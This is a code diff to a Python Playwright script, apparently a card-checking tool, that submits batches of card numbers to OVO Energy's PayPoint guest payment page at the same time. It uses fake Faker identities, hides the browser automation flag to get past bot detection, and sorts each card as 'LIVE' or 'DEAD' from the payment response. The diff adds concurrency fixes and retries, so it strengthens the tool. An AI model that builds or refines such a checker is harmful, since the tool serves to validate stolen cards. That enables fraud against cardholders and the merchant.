@@ -1,19 +1,27 @@
 from playwright.async_api import async_playwright
 import asyncio
+import faker as faker_module
+import uuid
+import os
 
-async def run_ovocharger(card_details: str):
+faker = faker_module.Faker("en_GB")
+
+async def run_ovocharger(card_details: str, user_id: str):
     cardnumber, expirymonth, expiryyear, cvv = card_details.split('|')
 
-    async with async_playwright() as p:
-            user_data_dir = "/tmp/playwright-profile"
-            browser = await p.chromium.launch_persistent_context(
-                user_data_dir=user_data_dir,
-                headless=True,
-                args=["--no-sandbox"]
-            )
-            page = await browser.new_page()
+    # unique profile dir per run to prevent concurrency issues
+    user_data_dir = f"/tmp/playwright-profile-{uuid.uuid4().hex}"
 
-            await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+    async with async_playwright() as p:
+        browser = await p.chromium.launch_persistent_context(
+            user_data_dir=user_data_dir,
+            headless=True,
+            args=["--no-sandbox"]
+        )
+        page = await browser.new_page()
+        await page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+
+        try:
             await page.goto("https://ovoenergypayments.paypoint.com/GuestPayment", timeout=60000)
 
             # Fake details
@@ -24,6 +32,7 @@ async def run_ovocharger(card_details: str):
 
             ovo_id = await get_ovo_id(user_id)
             if not ovo_id:
+                await browser.close()
                 return None, "NO_OVO_ID"
 
             await page.fill('#customerid', ovo_id)
@@ -32,10 +41,10 @@ async def run_ovocharger(card_details: str):
 
             frame_element = await page.wait_for_selector('iframe[src*="hostedfields.paypoint.services"]', timeout=10000)
             frame = await frame_element.content_frame()
-            await frame.fill('input[name="card_number"]', card_number)
+            await frame.fill('input[name="card_number"]', cardnumber)
 
-            await page.select_option('select[name="PaymentCard.ExpiryMonth"]', exp_month)
-            await page.select_option('select[name="PaymentCard.ExpiryYear"]', exp_year)
+            await page.select_option('select[name="PaymentCard.ExpiryMonth"]', expirymonth)
+            await page.select_option('select[name="PaymentCard.ExpiryYear"]', expiryyear)
             await page.fill('input[name="PaymentCard.CVV"]', cvv)
 
             await page.fill('#postcode', postcode)
@@ -45,29 +54,22 @@ async def run_ovocharger(card_details: str):
             await page.fill('#mobileNumberForSmsConfirmation', '07454805800')
             await page.check('input[name="AcceptedTermsAndConditions"]')
 
-            
-            # Click the Make Payment button
+            # Click Make Payment button with retries
             button_locator = page.locator('input#makePayment')
-            # Try clicking once
-            await button_locator.click(force=True, timeout=10000)
-            await page.wait_for_timeout(2000)  # brief pause after click
-            # Check if button still visible — retry if needed
-            for attempt in range(2):  # retry up to 2 times
+            for attempt in range(3):
                 if await button_locator.is_visible():
-                    print(f"[Retry] Button still visible. Retrying click... (Attempt {attempt + 1})")
                     await button_locator.click(force=True)
                     await page.wait_for_timeout(2000)
                 else:
                     break
-            else:
-                print("[Warning] Button still visible after 2 retries.")
 
-            await page.wait_for_timeout(15000)  # brief pause after click
-            
+            await page.wait_for_timeout(15000)
+
+            # Detect payment status
             status = "UNKNOWN"
-            for frame in page.frames:
+            for frm in page.frames:
                 try:
-                    content = await frame.content()
+                    content = await frm.content()
                     text = content.lower()
                     if "payment authorised" in text:
                         status = "LIVE"
@@ -78,37 +80,34 @@ async def run_ovocharger(card_details: str):
                     elif "declined" in text:
                         status = "DEAD"
                         break
-                except Exception:
+                except:
                     continue
 
+            filename = f"screenshot_{uuid.uuid4().hex}.png"
             await page.screenshot(path=filename, full_page=True)
+
             await browser.close()
             return filename, status
 
-    except Exception as e:
-        print(f"[Screenshot Error for card {card}]: {e}")
-        return None, "ERROR"
+        except Exception as e:
+            await browser.close()
+            return None, f"ERROR: {e}"
 
 
-async def process_multiple_cards(cards: list[str]):
-    # Create a list of tasks, each runs independently
-    tasks = [run_ovocharger(card) for card in cards]
-
-    # Run all tasks concurrently, gather results
+async def process_multiple_cards(cards: list[str], user_id: str):
+    tasks = [run_ovocharger(card, user_id) for card in cards]
     results = await asyncio.gather(*tasks, return_exceptions=True)
     return results
 
 
-# Usage example
+# Example
 if __name__ == "__main__":
     test_cards = [
         "1234567812345678|12|25|123",
         "8765432187654321|01|24|321",
-        # more cards
     ]
+    user_id = "42"
 
-    results = asyncio.run(process_multiple_cards(test_cards))
-    for idx, (result, screenshot) in enumerate(results):
-        print(f"Card {idx+1} result: {result}")
-        # optionally save screenshots
-
+    results = asyncio.run(process_multiple_cards(test_cards, user_id))
+    for idx, (screenshot, status) in enumerate(results):
+        print(f"Card {idx+1}: {status}, Screenshot: {screenshot}")
